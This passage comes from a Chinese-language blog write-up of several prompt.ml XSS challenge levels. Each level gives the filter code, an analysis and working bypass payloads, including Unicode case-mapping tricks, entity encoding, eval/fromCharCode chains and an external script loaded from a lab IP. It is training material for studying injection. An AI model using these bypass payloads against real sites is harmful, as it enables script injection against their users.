class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/*"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/prompt(/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/1)/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure><blockquote><p>注意： <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签用于声明 js 代码的范围，这两个标签不能从中间任何位置破开到两行，否则多行注释 <code>/* */</code> 就不会起作用了。另外我在测试 payload 的时候，也尝试过 <code>&lt;!-- --&gt;</code> HTML 注释，但是尖括号会造成标签错位导致注入失败，有兴趣的同学可以研究下。</p></blockquote><h4 id="6-xss-类型-8"><a class="markdownIt-Anchor" href="#6-xss-类型-8"></a> <code>⑥ xss 类型</code></h4><blockquote><p>利用 <code>#</code> 号进行绕过</p></blockquote><h3 id="font-color-navy0x08-unicode-编码逃逸font"><a class="markdownIt-Anchor" href="#font-color-navy0x08-unicode-编码逃逸font"></a> <font color="navy">0x08 Unicode 编码逃逸</font></h3><h4 id="1-js-代码-9"><a class="markdownIt-Anchor" href="#1-js-代码-9"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-9"><a class="markdownIt-Anchor" href="#2-题目分析-9"></a> <code>② 题目分析</code></h4><blockquote><p><code>&lt;script&gt;</code> 标签内的 <code>//</code> 注释了我们输入的内容，不管输入什么内容都被注释掉，并且正则表达式将 <code>\r\n</code> 过滤掉。</p></blockquote><h4 id="3-相关知识点-9"><a class="markdownIt-Anchor" href="#3-相关知识点-9"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li>换行的思想</li></ol></blockquote><h4 id="4-payload-9"><a class="markdownIt-Anchor" href="#4-payload-9"></a> <code>④ payload</code></h4><blockquote><p>在 console 控制台中输入 <code>'\u2028prompt(1)\u2028--&gt;'</code>，得到的结果就是 payload</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" prompt(1) --&gt;"</span><br></pre></td></tr></table></figure><blockquote><p>由于 <code>console</code> 被注释掉，我们输入的脚本无法被执行，所以我们需要换行，但是由于<code>\r\n</code> 回车换行符都被过滤掉了，因此无法直接换行。虽然 <strong>ASCII</strong> 字符的换行符被过滤了，但是在 JS 里面是可以直接使用 Unicode 字符的，即可以使用 <strong>Unicode</strong> 的换行符进行绕过。查一下 Unicode 空字符的编码表，其中换行符的编码是 <code>\u000A</code> 和 <code>\u2028</code>。但是 <code>\u000A</code> 等价于 ASCII 的 <code>\n</code> ，前面知道它被过滤了无法使用，所以可以使用 <code>\u2028</code> 作为替代。</p><p>这里成功使用假设<code>\u2028</code>字符换行，则跳出了 <code>//</code> 的注释：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// console.log("</span></span><br><span class="line">prompt(<span class="number">1</span>)<span class="string">");</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>但事实上这段代码由于语法错误，<code>prompt(1)</code> 是无法执行的，原因是末尾的 <code>&quot;);</code> ，我们在 <code>prompt(1)</code> 后面再次添加换行符 <code>\u2028</code>：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// console.log("</span></span><br><span class="line">prompt(<span class="number">1</span>)</span><br><span class="line"><span class="string">");</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>虽然这样把  <code>&quot;);</code>  换到另一行，依然是语法错误，还是因为 <code>&quot;);</code> ，我们需要将它注释掉，但是尖括号 <code>&lt;</code> 、双引号 <code>&quot;</code> 、反斜杠 <code>/</code> 也都被过滤了，所以既没办法提前闭合 <code>/script</code>， 也没办法使用另一个函数 <code>fun(&quot;</code> 向后闭合引号，当然多行注释 <code>/*</code> 和行注释 <code>//</code> 也没办法使用了，就更不用说 <code>&lt;!--</code> HTML 注释了（而且在 JS 区域内也没法用）。</p><p>这里需要使用到 JS 中的一个注释黑魔法：<font color="red"><strong>在 JS 代码中，当</strong> <code>--&gt;</code> <strong>位于行首时（左侧不能有任何非空字符），那么它相当于行注释</strong>。</font>因此在 <code>&quot;);</code> 换行符前面加上 <code>--&gt;</code>，就可以成功注释掉  <code>&quot;);</code> 。</p><p>因为<code>payload</code>在<code>console.log</code>中，所以题目并不会帮我们把 Unicode 编码 <code>\u2028</code> 直接转换为换行符，那么我们就需要直接输入这个换行符。但是使用键盘是无法输入这个换行符的，这里我借助了 <code>console</code> 将其直接打印出来。</p></blockquote><h4 id="5-html-source-9"><a class="markdownIt-Anchor" href="#5-html-source-9"></a> <code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                                    </span><br><span class="line">    <span class="comment">// console.log("</span> prompt(<span class="number">1</span>) --&gt;<span class="string">");        </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-9"><a class="markdownIt-Anchor" href="#6-xss-类型-9"></a> <code>⑥ xss 类型</code></h4><blockquote><p>console.log() 换行符的绕过 / Unicode 编码逃逸</p></blockquote><h3 id="font-color-navy0x09-ecmascriptfont"><a class="markdownIt-Anchor" href="#font-color-navy0x09-ecmascriptfont"></a> <font color="navy">0x09 ECMAScript</font></h3><h4 id="1-js-代码-10"><a class="markdownIt-Anchor" href="#1-js-代码-10"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-10"><a class="markdownIt-Anchor" href="#2-题目分析-10"></a> <code>② 题目分析</code></h4><blockquote><p>replace 将 <code>&lt;[a-zA-Z]</code> 变为 <code>&lt;_[a-zA-Z]</code>，并且对变化后的字符串全部转化成大写，返回 <code>&lt;h1&gt; + input + &lt;/h1&gt;</code>;</p></blockquote><h4 id="3-相关知识点-10"><a class="markdownIt-Anchor" href="#3-相关知识点-10"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>javascript</code> 外部文件的引用;</li><li><code>js</code> 的 <code>scrpit</code>, <code>src</code> 和 <code>域名</code> 的大小写不敏感 / HTML 的标签名和属性名都是大小写不敏感</li><li><code>toUpperCase()</code> 的特性：根据 <a href="http://ecma-international.org/ecma-262/5.1/#sec-15.5.4.18" target="_blank" rel="noopener">ECAMScript 定义</a>，<code>它不仅转换英文字母，也转换一些Unicode字符</code>，即它有意把某些 Unicode 字符映射到某些 ASCII 字符（串）：<ul><li>Unicode 的 <code>ı</code> 通过 <code>toUpperCase</code> 会被转换成 ASCII 的 <code>I</code></li><li>Unicode 的 <code>ſ</code> 通过 <code>toUpperCase</code> 会被转换成 ASCII 的 <code>S</code></li></ul></li></ol></blockquote><p><code>涉及其他相关性不大的知识点</code>：</p><blockquote><ol><li><p>在 <code>https</code> 网页中引入 <code>http</code> 资源：比如引入一个js文件，会被直接 block 掉的。在 HTTPS 页面里通过AJAX 的方式请求 HTTP 资源，也会被直接 block 掉的。但是在 <code>http</code> 网页中引入 <code>https</code> 资源不会被 block 掉。</p><blockquote><p>解决方法（不可知）：在相应的页面的<head><meta name="generator" content="Hexo 3.8.0">里加上这句代码 <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt;</code> ，意思是自动将http的不安全请求升级为 https。</head></p></blockquote></li></ol></blockquote><h4 id="4-payloads"><a class="markdownIt-Anchor" href="#4-payloads"></a> <code>④ payloads</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1：<span class="tag">&lt;<span class="name">ımg</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)</span> /&gt;</span></span><br><span class="line">payload2：<span class="tag">&lt;<span class="name">ſvg</span>&gt;</span><span class="tag">&lt;<span class="name">ſcript</span>&gt;</span>&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">payload3：<span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"http://192.168.126.132/%70%61%79%6c%6f%61%64.%6a%73"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>payload1 解析</code></p><blockquote><p>先把 <code>prompt</code> 编码成 <code>&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;</code> ，这样实体编码在输出到前端之前，从而绕过 <code>toUpperCase</code> 。看到别人又在外面加了一个 <code>svg</code> 标签，其实没有必要。</p></blockquote><p><code>payload2 解析</code></p><blockquote><p>因为 <code>&lt;script&gt;</code> 标签内部无法进行 <code>HTML 实体解码</code> 所以这里需要加上 <code>svg</code> 标签。</p></blockquote><p><code>payload3 解析</code></p><blockquote><p>这个 <code>payload</code> 一定要好好的解析一下，通过前期的学习可以得到<code>HTML 的标签名和属性名都是大小写不敏感</code>，于是第一次构造的 payload 为：<code>&lt;ſcript src=&quot;http://192.168.126.132/payload.js&quot;&gt;&lt;/script&gt;</code>，这个主机是我用虚拟机搭建的一个 web 站点，于是屁颠屁颠的填入上述的 payload，但是令我惊讶的是没有被被执行！！于是我在<a href="https://www.runoob.com/try/try.php?filename=tryhtml_script_src" target="_blank" rel="noopener">菜鸟教程</a>搭建的环境上去尝试该脚本，发现一个这样的错误：</p></blockquote><p><img src="/images/96-1.png" alt></p><blockquote><p>在查询了相关的资料后，发现这是因为在 <code>https</code> 网页中引入 <code>http</code> 资源，会被直接 block 掉的。原来菜鸟教程的 <code>protocol</code> 是 <code>https</code>，所以不能引入 <code>http</code> 协议的资源，我再去看看 <code>prompt.ml</code> 的协议，是不是也是这个原因造成的，但是令人失望的是它的协议也是 <code>http</code> (<a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a>)，我将上述的 payload 再次提交，查看流量数据，果然找到了问题所在：</p></blockquote><p><img src="/images/96-2.png" alt></p><blockquote><p>问题就是因为我们输入的 <code>payload.js</code> 资源名称被大写为 <code>PAYLOAD.JS</code> ，而服务器无法找到该名称的资源，因此无法成功执行<code>prompt(1)</code>，既然找到问题就好办了，我利用了 <code>URL 编码</code> 将 <code>payload.js</code> 进行绕过，使得 JS 代码无法过滤，但是能被 <code>URI 解析器</code> 解析，所以构造的 <code>payload3</code> 就被成功的执行了。</p></blockquote><h4 id="5-html-source-10"><a class="markdownIt-Anchor" href="#5-html-source-10"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">0</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SVG</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined">&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">SVG</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTP://192.168.126.132/%70%61%79%6C%6F%61%64.%6A%73"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-10"><a class="markdownIt-Anchor" href="#6-xss-类型-10"></a> <code>⑥ xss 类型</code></h4><blockquote><p>这是一道 ECMAScript 绕过的题目，但是涉及的知识点很多。</p></blockquote><h3 id="font-color-navy0x0a-绕过题目font"><a class="markdownIt-Anchor" href="#font-color-navy0x0a-绕过题目font"></a> <font color="navy">0x0A 绕过题目</font></h3><h4 id="1-js-代码-11"><a class="markdownIt-Anchor" href="#1-js-代码-11"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-11"><a class="markdownIt-Anchor" href="#2-题目分析-11"></a> <code>② 题目分析</code></h4><blockquote><p>首先是将输入进行一次 <code>encodeURIComponent</code> 编码，然后将 <code>prompt</code> 替换为 <code>alert</code> ，最后又将 <code>'</code> 过滤掉。</p></blockquote><h4 id="3-相关知识点-11"><a class="markdownIt-Anchor" href="#3-相关知识点-11"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>decodeURIComponent()</code> 函数的作用；</li><li>绕过的思想</li></ol></blockquote><h4 id="4-payload-10"><a class="markdownIt-Anchor" href="#4-payload-10"></a> <code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：prompt(p<span class="string">'rompt(1)) &amp; alert(p'</span>rompt(<span class="number">1</span>))</span><br><span class="line">payload2：<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br></pre></td></tr></table></figure><p><code>payload1</code>：</p><blockquote><p>主要说一下绕过的思想，通过对 <code>'</code> 符号的过滤，我们可以利用这一特性来构造 payload。</p><p>注：<code>'</code> 的位置和数量是可以变的，只要在 <code>prompt</code> 单词内部。</p></blockquote><p><code>payload2</code>：</p><blockquote><p>构造 payload2 时花了很长时间，一开始是用 <code>JS 解析器</code> 在解析标识符名称时（如<code>函数名</code>、<code>属性名</code>）等，若遇到 <code>Unicode</code> 会直接进行解码，并使得标识符依旧生效。于是构造了这个 payload： <code>\u0070\u0072\u006f\u006d\u0070\u0074(1)</code></p><p>绕过 <code>replace</code> 以在前端直接构造 <code>prompt(1)</code> , 但是 <code>\</code> 被 <code>encodeURIComponent</code> 转码成了 <code>%5C</code> ，失败。后来又想到 <code>eval</code> 函数，于是构造这个 payload：</p><p><code>eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))</code></p><p>期望可以绕过 <code>replace</code> 逐字符构造 <code>prompt(1)</code> ，但是 <code>,</code> 被 <code>encodeURIComponent</code> 转码成了 <code>%2C</code> ，还是失败。转念一想，既然不能用逗号 <code>,</code> 拼接字符，那么直接用 <code>concat</code> 函数就可以了，于是构造了 <code>payload2</code>。</p></blockquote><h4 id="5-html-source-11"><a class="markdownIt-Anchor" href="#5-html-source-11"></a> <code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：&lt;script&gt;alert(prompt(<span class="number">1</span>))&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">payload2：&lt;script&gt;eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41)))&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-11"><a class="markdownIt-Anchor" href="#6-xss-类型-11"></a> <code>⑥ xss 类型</code></h4><blockquote><p>简单一个根据 JS 规则，来进行绕过问题。</p></blockquote><h3 id="font-color-navy0x0b-in-exceptionfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0b-in-exceptionfont"></a> <font color="navy">0x0B In Exception</font></h3><h4 id="1-js-代码-12"><a class="markdownIt-Anchor" href="#1-js-代码-12"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-12"><a class="markdownIt-Anchor" href="#2-题目分析-12"></a> <code>② 题目分析</code></h4><blockquote><p>这道题目可以简化为：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'"Welcome back, '</span> + input + <span class="string">'."'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>其中 <code>input</code> 是我们输入的内容，允许输入的字符只有 <code>a-z</code>、<code>A-Z</code>、<code>0-9</code>、<code>&quot;</code>、<code>'</code>、<code>(</code>、<code>)</code> 。</p></blockquote><h4 id="3-相关知识点-12"><a class="markdownIt-Anchor" href="#3-相关知识点-12"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li>英文下的符号</li><li>JS 的异常机制： JS 会把 <code>()</code> 前面的字符串识别是 函数名，但由于函数不存在，会抛出异常，换言之， <code>()</code> 里面可能会被识别为函数的参数表，<strong>参数表优先于函数名被解析</strong>。</li><li>JavaScript 的 <code>in</code> 和 <code>instanceof</code>的语法</li></ol></blockquote><h4 id="4-payload-11"><a class="markdownIt-Anchor" href="#4-payload-11"></a> <code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="string">"(prompt(1)) instanceof "</span> </span><br><span class="line">payload2:<span class="string">"(prompt(1)) in "</span></span><br></pre></td></tr></table></figure><blockquote><p>如果我们只是输入 <code>&quot;(prompt(1))&quot;</code> 的话，那么 <code>HTML source</code> 的结果是这样的：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                                    </span><br><span class="line">    <span class="keyword">var</span> data = &#123;<span class="string">"action"</span>:<span class="string">"login"</span>,<span class="string">"message"</span>:<span class="string">"Welcome back, "</span>(prompt(<span class="number">1</span>))<span class="string">"."</span>&#125;;          </span><br><span class="line">    <span class="keyword">if</span> (data.action === <span class="string">"login"</span>)            </span><br><span class="line">        <span class="built_in">document</span>.write(data.message)        </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>需要注意到，在注入点的后面，还有一个小尾巴 <code>.</code> 。换言之，其实我们注入 <code>&quot;(prompt(1))&quot;</code> 这个 payload 后，得到的 JS 代码其实是这样的：<code>document.write(&quot;Welcome back, &quot;(prompt(1))&quot;.&quot;);</code>而这个小尾巴最致命的地方，就是它先于参数表的 <code>prompt(1)</code> 被解析，导致先抛出了一个 <code>SyntaxError</code> 语法错误的异常， <code>prompt(1)</code> 则无法被执行。</p><p>那么接下来就需要处理掉这个语法错误的问题，使得参数表可以被解析。但是由于 <code>+</code> 被过滤了，无法利用它拼接函数返回值和字符串去解决这个尾巴。不过 JS 还有一个 <code>in</code> （instanceof 也可以）操作符同样可以达到拼接目的，其使用方法是 <code>[a_object] in [b_object]</code> ，用于判断一个对象 a 是否被对象 b 包含。虽然 <code>in</code> 对 object 类型有要求，但是即使是类型错误，也只会在运行时抛出，而不会在最开始解析时就直接报语法错误，从而可以解决前面语法错误导致参数表的 <code>prompt(1)</code> 没有被解析的问题。</p></blockquote><p><code>执行顺序</code></p><blockquote><ul><li>解析并执行参数表的 <code>prompt(1)</code> （<strong>已经足以完成挑战</strong>）</li><li>抛出 <code>Welcome back,</code> 函数未定义异常</li><li>抛出 <code>in</code> 操作符的 <code>TypeError</code> 异常</li></ul></blockquote><h4 id="5-html-source-12"><a class="markdownIt-Anchor" href="#5-html-source-12"></a> <code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                                    </span><br><span class="line">    <span class="keyword">var</span> data = &#123;<span class="string">"action"</span>:<span class="string">"login"</span>,<span class="string">"message"</span>:<span class="string">"Welcome back, "</span>(prompt(<span class="number">1</span>))<span class="keyword">in</span><span class="string">"."</span>&#125;;          </span><br><span class="line">    <span class="keyword">if</span> (data.action === <span class="string">"login"</span>)            </span><br><span class="line">        <span class="built_in">document</span>.write(data.message)        </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-12"><a class="markdownIt-Anchor" href="#6-xss-类型-12"></a> <code>⑥ xss 类型</code></h4><blockquote><p>In Exception 的题型</p></blockquote><h3 id="font-color-navy0x0c-tostring-函数font"><a class="markdownIt-Anchor" href="#font-color-navy0x0c-tostring-函数font"></a> <font color="navy">0x0C toString 函数</font></h3><h4 id="1-js-代码-13"><a class="markdownIt-Anchor" href="#1-js-代码-13"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-13"><a class="markdownIt-Anchor" href="#2-题目分析-13"></a> <code>② 题目分析</code></h4><blockquote><p>该题和 <code>0x08</code> 题目相似，但是仔细看却发现两个replace的位置有所改变，思路也有所改变。</p></blockquote><h4 id="3-相关知识点-13"><a class="markdownIt-Anchor" href="#3-相关知识点-13"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>parseInt()</code> 和 <code>toString()</code>  函数的相关知识点；</li><li><code>eval()</code> 函数的相关知识点</li><li><code>String</code> 的相关属性，比如<code>fromCharCode()</code> 和 <code>concat()</code></li></ol></blockquote><h4 id="4-payload-12"><a class="markdownIt-Anchor" 